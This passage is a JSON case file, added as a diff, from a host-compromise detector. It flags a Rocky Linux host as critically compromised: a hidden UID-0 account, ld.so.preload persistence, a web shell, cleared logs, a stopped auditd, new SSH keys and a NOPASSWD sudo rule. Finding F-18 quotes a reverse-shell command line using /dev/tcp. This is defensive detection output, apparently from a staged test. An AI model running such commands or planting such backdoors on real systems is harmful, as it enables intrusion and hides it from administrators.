@@ -1,0 +1,2638 @@
+{
+ "case_format": 1,
+ "redaction": "pseudonymize",
+ "host": {
+  "name": "HOST-1-0000",
+  "group": null,
+  "os": "rocky 9.8",
+  "kernel": "5.14.0-687.61.1.el9_8.x86_64"
+ },
+ "assessment": {
+  "probability": 1.0,
+  "band": "Critical",
+  "prior": 0.02,
+  "prior_source": "golden",
+  "hygiene_and_exposure": {
+   "band": "none",
+   "counts": {
+    "hygiene": {
+     "info": 10
+    }
+   }
+  },
+  "top_contributors": [
+   "F-1",
+   "F-2",
+   "F-3",
+   "F-4",
+   "F-5",
+   "F-7",
+   "F-8",
+   "F-9",
+   "F-10",
+   "F-12"
+  ]
+ },
+ "findings": [
+  {
+   "id": "F-1",
+   "check": "account.uid0",
+   "variant": null,
+   "band": "critical",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 4.6052,
+   "suppressed_by": null,
+   "title": "An account other than root has UID 0",
+   "from_host": {
+    "summary": "USER-1-0000 has UID 0: it is root under another name",
+    "entities": [
+     "account:USER-1-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "accounts",
+      "text": "USER-1-0000: gid=0 home=/home/USER-1-0000 password={'status': 'shadowed'} shadow_last_change=2026-10-29 shadow_last_change_days=20755 shadow_max_days=99999 shadow_min_days=0 shadow_status=no_password shadow_warn_days=7 shell=/bin/bash uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-2",
+   "check": "persistence.ld_preload",
+   "variant": null,
+   "band": "critical",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 4.6052,
+   "suppressed_by": null,
+   "title": "/etc/ld.so.preload loads a library into every program",
+   "from_host": {
+    "summary": "/etc/ld.so.preload (17 bytes)",
+    "entities": [
+     "path:/etc/ld.so.preload"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "startup",
+      "text": "/etc/ld.so.preload: content_sha256=389a0151772aca8054c8a7ab5bdad62f134f2eb589de08d9d5605902072b4883 ctime=2026-10-29T15:51:18.146286+00:00 gid=0 inode=151345 mode=0644 mtime=2026-10-29T15:51:18.146286+00:00 size=17 uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-3",
+   "check": "account.changes",
+   "variant": "root_group",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A new account whose primary group is root-equivalent",
+   "from_host": {
+    "summary": "USER-1-0000: primary group root (GID 0)",
+    "entities": [
+     "account:USER-1-0000",
+     "group:root"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "accounts, since the baseline",
+      "text": "added: USER-1-0000: gid=0 home=/home/USER-1-0000 password={'status': 'shadowed'} shadow_last_change=2026-10-29 shadow_last_change_days=20755 shadow_max_days=99999 shadow_min_days=0 shadow_status=no_password shadow_warn_days=7 shell=/bin/bash uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-4",
+   "check": "container.privileged",
+   "variant": "new",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A container that holds the host since the baseline",
+   "from_host": {
+    "summary": "podman: cc-priv: has CAP_BPF, has CAP_DAC_READ_SEARCH, has CAP_SYS_ADMIN, has CAP_SYS_MODULE, has CAP_SYS_RAWIO, mounts /, privileged; image docker.io/library/alpine:latest (running)",
+    "entities": [
+     "container:podman: cc-priv",
+     "image:docker.io/library/alpine"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "containers, since the baseline",
+      "text": "added: podman: cc-priv: capabilities=['AUDIT_CONTROL', 'AUDIT_READ', 'AUDIT_WRITE', 'BLOCK_SUSPEND', 'BPF', 'CHECKPOINT_RESTORE', 'CHOWN', 'DAC_OVERRIDE', 'DAC_READ_SEARCH', 'FOWNER', 'FSETID', 'IPC_LOCK', 'IPC_OWNER', 'KILL', 'LEASE', 'LINUX_IMMUTABLE', 'MAC_ADMIN', 'MAC_OVERRIDE', 'MKNOD', 'NET_ADMIN', 'NET_BIND_SERVICE'…"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-5",
+   "check": "files.privileged",
+   "variant": null,
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A new privileged file since the baseline",
+   "from_host": {
+    "summary": "/tmp/.cc-sh: set-user-ID, owner UID 0",
+    "entities": [
+     "path:/tmp/.cc-sh"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "unusual_files, since the baseline",
+      "text": "added: /tmp/.cc-sh: ctime=2026-10-29T15:51:18.152286+00:00 gid=0 inode=151346 kind=elf mode=4755 mtime=2026-10-29T15:51:18.150286+00:00 name_flags=['hidden'] nlink=1 place=/tmp setgid=False setuid=True sha256=ec6d007d48ef11bc47ad3f372b4b20ff2f0d4e63867e7e4cc0f1b17b19fa88b2 size=1389024 type=- uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-7",
+   "check": "files.web",
+   "variant": null,
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A new script in a web root",
+   "from_host": {
+    "summary": "/usr/share/nginx/html/cc-shell.php (SHA-256 47d73aad164dc1b3…)",
+    "entities": [
+     "path:/usr/share/nginx/html/cc-shell.php"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "web_files, since the baseline",
+      "text": "added: /usr/share/nginx/html/cc-shell.php: ctime=2026-10-29T15:51:23.614222+00:00 gid=0 inode=265056 mode=0644 mtime=2026-10-29T15:51:23.609222+00:00 nlink=1 place=/usr/share/nginx/html setgid=False setuid=False sha256=47d73aad164dc1b31c8c28eaac43c768b5a84c462cb494a437ceda2d8b35f128 size=46 type=- uid=48"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-8",
+   "check": "history.disabled",
+   "variant": "link",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A shell history file is a link to /dev/null",
+   "from_host": {
+    "summary": "/root/.bash_history",
+    "entities": [
+     "path:/root/.bash_history"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "shell_history",
+      "text": "/root/.bash_history: accounts=['root', 'operator'] ctime=2026-10-29T15:51:26.722185+00:00 gid=0 inode=151356 link_target=/dev/null mode=0777 mtime=2026-10-29T15:51:26.722185+00:00 size=9 type=l uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-9",
+   "check": "logs.cleared",
+   "variant": "truncated",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A log was truncated since the previous collection",
+   "from_host": {
+    "summary": "/var/log/wtmp: 2304 bytes → 0 bytes, same inode",
+    "entities": [
+     "path:/var/log/wtmp"
+    ],
+    "entities_complete": true,
+    "excerpts": [],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-10",
+   "check": "logs.stopped",
+   "variant": "not_running",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A logging service that ran at the baseline isn't running",
+   "from_host": {
+    "summary": "auditd",
+    "entities": [
+     "program:auditd"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "logging, since the baseline",
+      "text": "removed: service: auditd: exe=/usr/sbin/auditd running=True"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-12",
+   "check": "mac.disabled",
+   "variant": "selinux",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "SELinux was turned down since the baseline",
+   "from_host": {
+    "summary": "now permissive, configured enforcing",
+    "entities": [],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "logging, since the baseline",
+      "text": "changed: selinux: mode: enforcing → permissive"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-13",
+   "check": "net.directory",
+   "variant": "smb_winrm",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A web-server account reached SMB",
+   "from_host": {
+    "summary": "sleep (pid 16523, www-data, /usr/bin/sleep): connected to 127.0.0.1 port 445, established",
+    "entities": [
+     "address:127.0.0.1",
+     "account:www-data",
+     "pid:16523",
+     "program:sleep",
+     "exe:/usr/bin/sleep"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "running process",
+      "text": "pid=16523 ppid=16521 comm=sleep exe=/usr/bin/sleep cmdline=sleep 7200 uids=[994, 994, 994, 994] start_time=2026-10-29T15:51:21.320000+00:00 cwd=/root"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:21.320000+00:00",
+    "last_seen": "2026-10-29T15:51:21.320000+00:00"
+   }
+  },
+  {
+   "id": "F-14",
+   "check": "pam.changes",
+   "variant": null,
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A PAM line was added that runs a program (pam_exec)",
+   "from_host": {
+    "summary": "/etc/pam.d/sshd: session optional pam_exec.so quiet /bin/true",
+    "entities": [
+     "path:/etc/pam.d/sshd",
+     "module:pam_exec.so"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "pam_rules, since the baseline",
+      "text": "added: /etc/pam.d/sshd: session optional pam_exec.so quiet /bin/true: path=/etc/pam.d/sshd"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-16",
+   "check": "process.executable",
+   "variant": null,
+   "band": "high",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A process whose program was deleted",
+   "from_host": {
+    "summary": "cc-sleep (pid 16482): /root/cc-sleep (deleted)",
+    "entities": [
+     "program:cc-sleep",
+     "pid:16482",
+     "exe:/root/cc-sleep (deleted)"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "running process",
+      "text": "pid=16482 ppid=1 comm=cc-sleep exe=/root/cc-sleep (deleted) cmdline=/root/cc-sleep 7200 uids=[0, 0, 0, 0] start_time=2026-10-29T15:51:18.120000+00:00 cwd=/root"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:18.120000+00:00",
+    "last_seen": "2026-10-29T15:51:18.120000+00:00"
+   }
+  },
+  {
+   "id": "F-18",
+   "check": "process.reverse_shell",
+   "variant": null,
+   "band": "high",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A shell talking to a network socket (a reverse shell)",
+   "from_host": {
+    "summary": "bash (pid 16494): stdin is tcp to 127.0.0.1:4444",
+    "entities": [
+     "program:bash",
+     "pid:16494",
+     "exe:/usr/bin/bash"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "running process",
+      "text": "pid=16494 ppid=1 comm=bash exe=/usr/bin/bash cmdline=bash -c exec 0<>/dev/tcp/127.0.0.1/4444 1>/dev/null 2>&1 || exit 1; while :; do sleep 3600; done uids=[0, 0, 0, 0] start_time=2026-10-29T15:51:19.670000+00:00 cwd=/root"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:19.670000+00:00",
+    "last_seen": "2026-10-29T15:51:19.670000+00:00"
+   }
+  },
+  {
+   "id": "F-19",
+   "check": "ssh.authorized_keys",
+   "variant": "new_key",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A new authorized SSH key",
+   "from_host": {
+    "summary": "USER-2-0000: ssh-ed25519 KEY-1-0000 in /home/USER-2-0000/.ssh/authorized_keys",
+    "entities": [
+     "account:USER-2-0000",
+     "key:KEY-1-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "authorized_keys, since the baseline",
+      "text": "added: USER-2-0000 KEY-1-0000 /home/USER-2-0000/.ssh/authorized_keys: account=USER-2-0000 comment=cc-proof-admin fingerprint=KEY-1-0000 key_bytes=51 path=/home/USER-2-0000/.ssh/authorized_keys type=ssh-ed25519"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-24",
+   "check": "sshd.config",
+   "variant": null,
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "An sshd setting was added",
+   "from_host": {
+    "summary": "/etc/ssh/sshd_config.d/00-cc-proof.conf: permitrootlogin yes",
+    "entities": [
+     "path:/etc/ssh/sshd_config.d/00-cc-proof.conf"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "sshd_config, since the baseline",
+      "text": "added: /etc/ssh/sshd_config.d/00-cc-proof.conf: permitrootlogin yes: keyword=permitrootlogin path=/etc/ssh/sshd_config.d/00-cc-proof.conf value=yes"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-25",
+   "check": "sudo.rules",
+   "variant": null,
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A new sudo rule without a password (NOPASSWD)",
+   "from_host": {
+    "summary": "/etc/sudoers.d/cc-admin: USER-2-0000 ALL=(ALL) NOPASSWD: ALL",
+    "entities": [
+     "path:/etc/sudoers.d/cc-admin",
+     "account:USER-2-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "sudo_rules, since the baseline",
+      "text": "added: /etc/sudoers.d/cc-admin: USER-2-0000 ALL=(ALL) NOPASSWD: ALL: path=/etc/sudoers.d/cc-admin"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-27",
+   "check": "web.worker_child",
+   "variant": "history",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 2.9957,
+   "suppressed_by": null,
+   "title": "A web account started a shell running an attacker's command",
+   "from_host": {
+    "summary": "apache ran bash 1 time, e.g. sh -c uname -a",
+    "entities": [
+     "account:apache",
+     "program:bash"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:audit",
+      "text": "sh -c uname -a"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:23.041747+00:00",
+    "last_seen": "2026-10-29T15:51:23.041747+00:00"
+   }
+  },
+  {
+   "id": "F-6",
+   "check": "files.scratch",
+   "variant": null,
+   "band": "high",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.6931,
+   "suppressed_by": null,
+   "title": "A program in a scratch directory",
+   "from_host": {
+    "summary": "/tmp/.cc-sh (owner UID 0)",
+    "entities": [
+     "path:/tmp/.cc-sh"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "unusual_files",
+      "text": "/tmp/.cc-sh: ctime=2026-10-29T15:51:18.152286+00:00 gid=0 inode=151346 kind=elf mode=4755 mtime=2026-10-29T15:51:18.150286+00:00 name_flags=['hidden'] nlink=1 place=/tmp setgid=False setuid=True sha256=ec6d007d48ef11bc47ad3f372b4b20ff2f0d4e63867e7e4cc0f1b17b19fa88b2 size=1389024 type=- uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-11",
+   "check": "logs.stopped",
+   "variant": "audit_daemon",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.6931,
+   "suppressed_by": null,
+   "title": "The audit daemon stopped, not during a shutdown",
+   "from_host": {
+    "summary": "type=DAEMON_END msg=audit(1793289086.766:735): op=terminate auid=0 uid=0 ses=1 pid=16562 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 res=success\\u001dAUID=\"root\" UID=\"root\"",
+    "entities": [],
+    "entities_complete": true,
+    "excerpts": [],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:26+00:00",
+    "last_seen": "2026-10-29T15:51:26+00:00"
+   }
+  },
+  {
+   "id": "F-15",
+   "check": "persistence.changes",
+   "variant": null,
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.6931,
+   "suppressed_by": null,
+   "title": "A new startup file",
+   "from_host": {
+    "summary": "/etc/ld.so.preload",
+    "entities": [
+     "path:/etc/ld.so.preload"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "startup, since the baseline",
+      "text": "added: /etc/ld.so.preload: content_sha256=389a0151772aca8054c8a7ab5bdad62f134f2eb589de08d9d5605902072b4883 ctime=2026-10-29T15:51:18.146286+00:00 gid=0 inode=151345 mode=0644 mtime=2026-10-29T15:51:18.146286+00:00 size=17 uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-17",
+   "check": "process.injected",
+   "variant": "scratch",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.6931,
+   "suppressed_by": null,
+   "title": "A process has code mapped from a scratch or home file",
+   "from_host": {
+    "summary": "cc-sleep (pid 16482): /root/cc-sleep (deleted)",
+    "entities": [
+     "program:cc-sleep",
+     "pid:16482",
+     "exe:/root/cc-sleep (deleted)"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "running process",
+      "text": "pid=16482 ppid=1 comm=cc-sleep exe=/root/cc-sleep (deleted) cmdline=/root/cc-sleep 7200 uids=[0, 0, 0, 0] start_time=2026-10-29T15:51:18.120000+00:00 cwd=/root"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:18.120000+00:00",
+    "last_seen": "2026-10-29T15:51:18.120000+00:00"
+   }
+  },
+  {
+   "id": "F-26",
+   "check": "web.new_script_hit",
+   "variant": null,
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.6931,
+   "suppressed_by": null,
+   "title": "A script new since the baseline answered requests",
+   "from_host": {
+    "summary": "/usr/share/nginx/html/cc-shell.php: 5 requests answered, from 127.0.0.0/24",
+    "entities": [
+     "path:/usr/share/nginx/html/cc-shell.php",
+     "account:apache"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:/var/log/nginx/access.log",
+      "text": "127.0.0.1 - - [29/Oct/2026:15:51:23 +0000] \"GET /cc-shell.php?c=[MASKED:value] HTTP/1.1\" 200 96 \"-\" \"curl/7.76.1\" \"-\""
+     },
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:/var/log/nginx/access.log",
+      "text": "127.0.0.1 - - [29/Oct/2026:15:51:23 +0000] \"GET /cc-shell.php?c=[MASKED:value] HTTP/1.1\" 200 96 \"-\" \"curl/7.76.1\" \"-\""
+     },
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:/var/log/nginx/access.log",
+      "text": "127.0.0.1 - - [29/Oct/2026:15:51:23 +0000] \"GET /cc-shell.php?c=[MASKED:value] HTTP/1.1\" 200 96 \"-\" \"curl/7.76.1\" \"-\""
+     },
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:/var/log/nginx/access.log",
+      "text": "127.0.0.1 - - [29/Oct/2026:15:51:23 +0000] \"GET /cc-shell.php?c=[MASKED:value] HTTP/1.1\" 200 139 \"-\" \"curl/7.76.1\" \"-\""
+     },
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:/var/log/nginx/access.log",
+      "text": "127.0.0.1 - - [29/Oct/2026:15:51:23 +0000] \"GET /cc-shell.php?c=[MASKED:value]&f=[MASKED:exploit:traversal] HTTP/1.1\" 200 96 \"-\" \"curl/7.76.1\" \"-\""
+     },
+     {
+      "text": "… and 1 more"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:23.041747+00:00",
+    "last_seen": "2026-10-29T15:51:23.041747+00:00"
+   }
+  },
+  {
+   "id": "F-28",
+   "check": "web.worker_child",
+   "variant": "history",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.231,
+   "suppressed_by": null,
+   "title": "A web account started a shell running an attacker's command",
+   "from_host": {
+    "summary": "apache ran bash 4 times, e.g. sh -c id",
+    "entities": [
+     "account:apache",
+     "program:bash"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:audit",
+      "text": "sh -c id"
+     },
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:audit",
+      "text": "sh -c id"
+     },
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:audit",
+      "text": "sh -c id"
+     },
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:audit",
+      "text": "sh -c id"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:23.041747+00:00",
+    "last_seen": "2026-10-29T15:51:23.041747+00:00"
+   }
+  },
+  {
+   "id": "F-29",
+   "check": "web.worker_child",
+   "variant": "history",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.231,
+   "suppressed_by": null,
+   "title": "A web account started a reconnaissance command",
+   "from_host": {
+    "summary": "apache ran id 4 times, e.g. id",
+    "entities": [
+     "account:apache",
+     "program:id"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:audit",
+      "text": "id"
+     },
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:audit",
+      "text": "id"
+     },
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:audit",
+      "text": "id"
+     },
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:audit",
+      "text": "id"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:23.041747+00:00",
+    "last_seen": "2026-10-29T15:51:23.041747+00:00"
+   }
+  },
+  {
+   "id": "F-30",
+   "check": "web.worker_child",
+   "variant": "history",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.231,
+   "suppressed_by": null,
+   "title": "A web account started a reconnaissance command",
+   "from_host": {
+    "summary": "apache ran uname 1 time, e.g. uname -a",
+    "entities": [
+     "account:apache",
+     "program:uname"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:audit",
+      "text": "uname -a"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:23.041747+00:00",
+    "last_seen": "2026-10-29T15:51:23.041747+00:00"
+   }
+  },
+  {
+   "id": "F-20",
+   "check": "ssh.authorized_keys",
+   "variant": "new_key",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.1733,
+   "suppressed_by": null,
+   "title": "A new authorized SSH key",
+   "from_host": {
+    "summary": "operator: ssh-ed25519 KEY-2-0000 in /root/.ssh/authorized_keys",
+    "entities": [
+     "account:operator",
+     "key:KEY-2-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "authorized_keys, since the baseline",
+      "text": "added: operator KEY-2-0000 /root/.ssh/authorized_keys: account=operator comment=cc-proof-backdoor fingerprint=KEY-2-0000 key_bytes=51 path=/root/.ssh/authorized_keys type=ssh-ed25519"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-21",
+   "check": "ssh.authorized_keys",
+   "variant": "new_key",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.1733,
+   "suppressed_by": null,
+   "title": "A new authorized SSH key",
+   "from_host": {
+    "summary": "operator: ssh-ed25519 KEY-3-0000 in /root/.ssh/authorized_keys",
+    "entities": [
+     "account:operator",
+     "key:KEY-3-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "authorized_keys, since the baseline",
+      "text": "added: operator KEY-3-0000 /root/.ssh/authorized_keys: account=operator comment=root@localhost fingerprint=KEY-3-0000 key_bytes=51 path=/root/.ssh/authorized_keys type=ssh-ed25519"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-22",
+   "check": "ssh.authorized_keys",
+   "variant": "new_key",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.1733,
+   "suppressed_by": null,
+   "title": "A new authorized SSH key",
+   "from_host": {
+    "summary": "root: ssh-ed25519 KEY-2-0000 in /root/.ssh/authorized_keys",
+    "entities": [
+     "account:root",
+     "key:KEY-2-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "authorized_keys, since the baseline",
+      "text": "added: root KEY-2-0000 /root/.ssh/authorized_keys: account=root comment=cc-proof-backdoor fingerprint=KEY-2-0000 key_bytes=51 path=/root/.ssh/authorized_keys type=ssh-ed25519"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-23",
+   "check": "ssh.authorized_keys",
+   "variant": "new_key",
+   "band": "high",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.1733,
+   "suppressed_by": null,
+   "title": "A new authorized SSH key",
+   "from_host": {
+    "summary": "root: ssh-ed25519 KEY-3-0000 in /root/.ssh/authorized_keys",
+    "entities": [
+     "account:root",
+     "key:KEY-3-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "authorized_keys, since the baseline",
+      "text": "added: root KEY-3-0000 /root/.ssh/authorized_keys: account=root comment=root@localhost fingerprint=KEY-3-0000 key_bytes=51 path=/root/.ssh/authorized_keys type=ssh-ed25519"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-34",
+   "check": "account.log_changes",
+   "variant": "created",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 1.3863,
+   "suppressed_by": null,
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "created: USER-1-0000 UID 0",
+    "entities": [
+     "account:USER-1-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:51:18",
+      "where": "auth_journal",
+      "text": "new user: name=USER-1-0000, UID=0, GID=0, home=/home/USER-1-0000, shell=/bin/bash, from=none"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:18.143068+00:00",
+    "last_seen": "2026-10-29T15:51:18.143068+00:00"
+   }
+  },
+  {
+   "id": "F-38",
+   "check": "mail.web_user",
+   "variant": null,
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 1.3863,
+   "suppressed_by": null,
+   "title": "Mail submitted by a web-server account",
+   "from_host": {
+    "summary": "www-data: 150 messages",
+    "entities": [
+     "account:www-data"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:51:30",
+      "where": "mail_journal",
+      "text": "66F6940EF6: uid=994 from=<h:707c3e5108b5>"
+     },
+     {
+      "when": "2026-10-29T15:51:30",
+      "where": "mail_journal",
+      "text": "745D640EF7: uid=994 from=<h:707c3e5108b5>"
+     },
+     {
+      "when": "2026-10-29T15:51:30",
+      "where": "mail_journal",
+      "text": "830AF40EF8: uid=994 from=<h:707c3e5108b5>"
+     },
+     {
+      "when": "2026-10-29T15:51:30",
+      "where": "mail_journal",
+      "text": "91EF440EF6: uid=994 from=<h:707c3e5108b5>"
+     },
+     {
+      "when": "2026-10-29T15:51:30",
+      "where": "mail_journal",
+      "text": "A02BD40EF9: uid=994 from=<h:707c3e5108b5>"
+     },
+     {
+      "text": "… and 45 more"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:30.463785+00:00",
+    "last_seen": "2026-10-29T15:51:36.465528+00:00"
+   }
+  },
+  {
+   "id": "F-39",
+   "check": "net.config",
+   "variant": "file",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 1.3863,
+   "suppressed_by": null,
+   "title": "A network configuration file was changed",
+   "from_host": {
+    "summary": "/etc/hosts",
+    "entities": [
+     "path:/etc/hosts"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "network_files, since the baseline",
+      "text": "changed: /etc/hosts: content_sha256: 498f494232085ec83303a2bc6f04bea840c2b210fbbeda31a46a6e5674d4fc0e → ce2401488993bafe59f819a3ffcd7e972096caae2bc71df05fcaa05731b1e80f; ctime: 2026-10-28T11:07:28.693151+00:00 → 2026-10-29T15:51:21.575246+00:00; mtime: 2020-06-23T06:11:43+00:00 → 2026-10-29T15:51:21.575246+00:00; size: 158 → 182"
+     }
